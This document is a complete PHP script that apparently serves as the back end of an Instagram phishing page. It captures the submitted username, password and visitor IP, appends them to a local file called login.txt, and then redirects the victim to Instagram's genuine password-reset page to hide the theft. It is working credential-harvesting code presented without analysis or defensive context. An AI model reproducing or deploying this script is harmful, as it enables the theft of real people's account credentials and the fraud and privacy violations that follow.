<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"] ?? '';
    $password = $_POST["password"] ?? '';
    $ip = $_SERVER['REMOTE_ADDR'];

    $data = "Instagram Username: $username | Pass: $password | IP: $ip\n";

    file_put_contents("login.txt", $data, FILE_APPEND);

    header('Location: https://instagram.com/accounts/password/reset/');
    exit();
}
?>
